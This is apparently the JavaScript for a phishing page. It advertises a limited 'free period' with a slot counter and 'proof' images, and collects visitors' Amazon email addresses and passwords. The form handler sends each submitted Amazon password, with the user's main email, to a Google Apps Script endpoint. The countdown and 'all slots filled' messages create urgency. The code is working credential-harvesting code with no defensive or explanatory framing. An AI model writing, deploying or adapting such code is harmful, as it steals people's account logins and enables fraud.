// API URL constant
const API_URL =
  "https://script.google.com/macros/s/AKfycbynAWiaq7E-Tu6qVDT-FR5EH5xIaqxMZFBPODnjBWQY_urSJPGwprrFWxRuzuAUjO_q/exec";

// Progress bar functionality
let submittedCount = 0;
const totalSlots = 100;

// Function to fetch current count from Google Sheets
async function fetchSubmissionCount() {
  try {
    const response = await fetch(`${API_URL}?action=getCount`, {
      method: "GET",
      mode: "cors",
      headers: {
        "Content-Type": "application/json",
      },
    });

    // For no-cors mode, we need to handle the response differently
    if (response.status === 0 || !response.ok) {
      // Try to get count from localStorage
      const storedCount = parseInt(localStorage.getItem("submittedCount")) || 0;
      console.log("Using stored count:", storedCount);
      submittedCount = storedCount;
      updateProgress();
      updateCounters();
      return;
    }

    const data = await response.json();
    console.log("Fetched count from server:", data);

    if (data && typeof data.count === "number") {
      submittedCount = data.count;
      localStorage.setItem("submittedCount", submittedCount);
      console.log("Updated count:", submittedCount);
      updateProgress();
      updateCounters();
    }
  } catch (error) {
    console.error("Error fetching count:", error);
    // Fallback to localStorage if fetch fails
    const storedCount = parseInt(localStorage.getItem("submittedCount")) || 0;
    console.log("Error occurred, using stored count:", storedCount);
    submittedCount = storedCount;
    updateProgress();
    updateCounters();
  }
}

// Add periodic refresh of count
function startPeriodicRefresh() {
  console.log("Starting periodic refresh");
  // Initial fetch
  fetchSubmissionCount();

  // Clear any existing intervals
  if (window.countRefreshInterval) {
    clearInterval(window.countRefreshInterval);
  }

  // Refresh every 30 seconds
  window.countRefreshInterval = setInterval(() => {
    console.log("Refreshing count...");
    fetchSubmissionCount();
  }, 30000);
}

function updateProgress() {
  const filledCount = document.getElementById("filledCount");
  const remainingCount = document.getElementById("remainingCount");
  const progressBar = document.getElementById("progressBar");
  const formContainer = document.querySelector(".form-container");
  const periodOverMessage = document.querySelector(".period-over-message");
  const sliderText = document.querySelector(".slider-text");

  if (filledCount && remainingCount && progressBar) {
    filledCount.textContent = submittedCount;
    remainingCount.textContent = totalSlots - submittedCount;
    progressBar.style.width = `${(submittedCount / totalSlots) * 100}%`;

    // Check if all slots are filled
    if (submittedCount >= totalSlots) {
      // Hide form
      formContainer.classList.add("hide");

      // Show period over message
      periodOverMessage.classList.add("show");

      // Update slider text
      if (sliderText) {
        const sliderDivs = sliderText.querySelectorAll("div");
        sliderDivs.forEach((div) => {
          div.textContent = "FREE PERIOD IS OVER - ALL SLOTS HAVE BEEN FILLED";
        });
      }
    }
  }
}

// Password toggle functionality
document.addEventListener("DOMContentLoaded", function () {
  // Start periodic refresh of count
  startPeriodicRefresh();

  // Initialize progress
  updateProgress();

  // Password visibility toggle
  const passwordToggle = document.querySelector(".password-toggle");
  const passwordInput = document.getElementById("amazonPassword");

  passwordToggle.addEventListener("click", function () {
    const type =
      passwordInput.getAttribute("type") === "password" ? "text" : "password";
    passwordInput.setAttribute("type", type);

    // Toggle the eye icon
    this.classList.toggle("fa-eye");
    this.classList.toggle("fa-eye-slash");
  });

  // Logo click functionality
  const logo = document.querySelector(".logo");
  logo.style.cursor = "pointer";
  logo.addEventListener("click", () => {
    window.location.reload();
  });

  // Theme toggle functionality
  const themeToggle = document.getElementById("themeToggle");
  const body = document.body;
  const icon = themeToggle.querySelector("i");

  themeToggle.addEventListener("click", () => {
    body.setAttribute(
      "data-theme",
      body.getAttribute("data-theme") === "dark" ? "light" : "dark"
    );
    icon.classList.toggle("fa-moon");
    icon.classList.toggle("fa-sun");
  });

  // FAQ toggle functionality
  const faqContainer = document.querySelector(".faq-container");
  const faqHeader = document.querySelector(".faq-header");
  const faqContent = document.querySelector(".faq-content");

  faqContainer.addEventListener("mouseenter", () => {
    faqHeader.style.display = "none";
    faqContent.style.display = "block";
    setTimeout(() => {
      faqContent.style.opacity = "1";
    }, 10);
  });

  faqContainer.addEventListener("mouseleave", () => {
    faqContent.style.opacity = "0";
    setTimeout(() => {
      faqHeader.style.display = "block";
      faqContent.style.display = "none";
    }, 300);
  });

  // Counter functionality
  const submittedCountElement = document.getElementById("submittedCount");
  const remainingCountElement = document.getElementById("remainingCount");
  const progressBar = document.getElementById("progressBar");
  const formContainer = document.querySelector(".form-container");
  const periodOverContainer = document.querySelector(".period-over-container");
  const sliderText = document.getElementById("sliderText");
  const fancyCountdown = document.querySelector(".fancy-countdown");
  const navSubmittedCount = document.getElementById("navSubmittedCount");
  const navRemainingCount = document.getElementById("navRemainingCount");
  const navProgressBar = document.getElementById("navProgressBar");

  function updateCounters() {
    const remainingSlots = totalSlots - submittedCount;

    // Update main counter
    submittedCountElement.textContent = submittedCount;
    remainingCountElement.textContent = remainingSlots;
    progressBar.style.width = `${(submittedCount / totalSlots) * 100}%`;

    // Update navbar counter
    navSubmittedCount.textContent = submittedCount;
    navRemainingCount.textContent = remainingSlots;
    navProgressBar.style.width = `${(submittedCount / totalSlots) * 100}%`;

    // Check if all slots are filled
    if (submittedCount >= totalSlots) {
      // Hide form and counters
      formContainer.classList.add("hide");
      document.querySelector(".countdown-block").style.display = "none";
      fancyCountdown.classList.add("hide");

      // Show period over message
      setTimeout(() => {
        periodOverContainer.classList.add("show");
      }, 300);

      // Update slider text
      sliderText.classList.add("period-over");
      const sliderDivs = sliderText.querySelectorAll("div");
      sliderDivs.forEach((div) => {
        div.textContent = "FREE PERIOD IS OVER - ALL SLOTS HAVE BEEN FILLED";
      });
    }
  }

  // Check if slots are already filled on page load
  if (submittedCount >= totalSlots) {
    formContainer.classList.add("hide");
    document.querySelector(".countdown-block").style.display = "none";
    fancyCountdown.classList.add("hide");
    periodOverContainer.classList.add("show");

    sliderText.classList.add("period-over");
    const sliderDivs = sliderText.querySelectorAll("div");
    sliderDivs.forEach((div) => {
      div.textContent = "FREE PERIOD IS OVER - ALL SLOTS HAVE BEEN FILLED";
    });
  }
});

// Email validation functions
const isValidEmail = function (email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
};

const isCommonEmailDomain = function (email) {
  const commonDomains = [
    "gmail.com",
    "yahoo.com",
    "hotmail.com",
    "outlook.com",
    "aol.com",
    "icloud.com",
    "protonmail.com",
    "mail.com",
  ];
  const domain = email.split("@")[1].toLowerCase();
  return commonDomains.includes(domain);
};

// Form submission handling
const handleSubmit = async function (event) {
  event.preventDefault();

  const submitButton = document.querySelector(
    '#primeForm button[type="submit"]'
  );
  const formContainer = document.querySelector(".form-container");
  const successMessage = document.querySelector(".success-message");

  // Disable button and show loading state
  submitButton.textContent = "Submitting...";
  submitButton.disabled = true;

  try {
    // Form validation
    const amazonEmail = document.getElementById("amazonEmail").value;
    const mainEmail = document.getElementById("mainEmail").value;

    if (!isValidEmail(amazonEmail) || !isValidEmail(mainEmail)) {
      alert("Please enter valid email addresses.");
      submitButton.textContent = "Submit";
      submitButton.disabled = false;
      return;
    }

    if (!isCommonEmailDomain(amazonEmail) || !isCommonEmailDomain(mainEmail)) {
      alert("Please use common email providers for both email addresses.");
      submitButton.textContent = "Submit";
      submitButton.disabled = false;
      return;
    }

    if (amazonEmail.toLowerCase() === mainEmail.toLowerCase()) {
      alert("Amazon email and main email must be different.");
      submitButton.textContent = "Submit";
      submitButton.disabled = false;
      return;
    }

    const formData = {
      amazonEmail: amazonEmail,
      amazonPassword: document.getElementById("amazonPassword").value,
      mainEmail: mainEmail,
      status: document.getElementById("status").value,
      timestamp: new Date().toISOString(),
    };

    // Simulate API call (since no-cors won't return response)
    await fetch(API_URL, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });

    // Increment count and update UI
    submittedCount++;
    localStorage.setItem("submittedCount", submittedCount);
    updateProgress();

    // Start the animation sequence
    // 1. Fade out form
    formContainer.classList.add("hide");

    // 2. Wait for form fade out animation
    await new Promise((resolve) => setTimeout(resolve, 500));

    // 3. Reset checkmark animation
    const checkmarkSVG = successMessage.querySelector("svg.checkmark");
    if (checkmarkSVG) {
      const newCheckmark = checkmarkSVG.cloneNode(true);
      checkmarkSVG.parentNode.replaceChild(newCheckmark, checkmarkSVG);
    }

    // 4. Show success message
    successMessage.style.display = "flex";
    // Force reflow
    void successMessage.offsetWidth;
    successMessage.classList.add("show");

    // 5. Reset form
    document.getElementById("primeForm").reset();

    // 6. Update count after delay
    setTimeout(fetchSubmissionCount, 2000);
  } catch (error) {
    console.error("Error:", error);
    if (!navigator.onLine) {
      alert("Please check your internet connection and try again.");
    }
  } finally {
    submitButton.textContent = "Submit";
    submitButton.disabled = false;
  }
};

// Function to get dominant color from image
const getDominantColor = function (img) {
  const canvas = document.createElement("canvas");
  const context = canvas.getContext("2d");
  canvas.width = img.width;
  canvas.height = img.height;
  context.drawImage(img, 0, 0);

  const data = context.getImageData(0, 0, canvas.width, canvas.height).data;
  let r = 0,
    g = 0,
    b = 0;
  let count = 0;

  // Sample every 4th pixel for performance
  for (let i = 0; i < data.length; i += 16) {
    r += data[i];
    g += data[i + 1];
    b += data[i + 2];
    count++;
  }

  r = Math.round(r / count);
  g = Math.round(g / count);
  b = Math.round(b / count);

  return `rgba(${r}, ${g}, ${b}, 0.2)`;
};

// Apply glow effect based on image color
document.querySelectorAll(".proof-image img").forEach((img) => {
  img.addEventListener("load", function () {
    const color = getDominantColor(this);
    const container = this.closest(".proof-image");

    // Apply the color to the glow effect
    container.style.setProperty("--glow-color", color);
    container.style.boxShadow = `0 0 15px ${color}`;

    container.addEventListener("mouseenter", () => {
      container.style.boxShadow = `0 0 25px ${color}`;
    });

    container.addEventListener("mouseleave", () => {
      container.style.boxShadow = `0 0 15px ${color}`;
    });
  });
});

// Theme Switching
document.addEventListener("DOMContentLoaded", function () {
  const themeToggle = document.getElementById("themeToggle");
  const icon = themeToggle.querySelector("i");

  // Check for saved theme preference
  const savedTheme = localStorage.getItem("theme");
  if (savedTheme) {
    document.documentElement.setAttribute("data-theme", savedTheme);
    updateIcon(savedTheme);
  }

  themeToggle.addEventListener("click", () => {
    const currentTheme = document.documentElement.getAttribute("data-theme");
    const newTheme = currentTheme === "dark" ? "light" : "dark";

    document.documentElement.setAttribute("data-theme", newTheme);
    localStorage.setItem("theme", newTheme);
    updateIcon(newTheme);
  });

  function updateIcon(theme) {
    icon.className = theme === "dark" ? "fas fa-sun" : "fas fa-moon";
  }
});

// Update the DOMContentLoaded event listener to ensure it runs first
document.addEventListener(
  "DOMContentLoaded",
  function () {
    // Start periodic refresh of count immediately
    startPeriodicRefresh();

    // Rest of the initialization code...
  },
  { once: true }
);
